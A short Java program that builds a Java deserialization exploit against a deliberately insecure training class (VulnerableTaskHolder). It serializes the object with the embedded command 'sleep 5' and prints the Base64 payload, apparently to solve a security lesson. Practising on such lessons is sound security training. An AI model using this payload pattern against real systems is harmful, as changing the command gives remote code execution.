

import java.io.*;
import java.util.*;
import java.time.*;
import org.dummy.insecure.framework.VulnerableTaskHolder;

public class Program {
   public static void main(String args[]) throws Exception{

        VulnerableTaskHolder o = new VulnerableTaskHolder("delayRespone", "sleep 5");
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos);
		oos.writeObject(o);
        oos.flush();
        byte[] exploit = baos.toByteArray();
		 System.out.println(Base64.getEncoder().encodeToString(exploit));
   }
}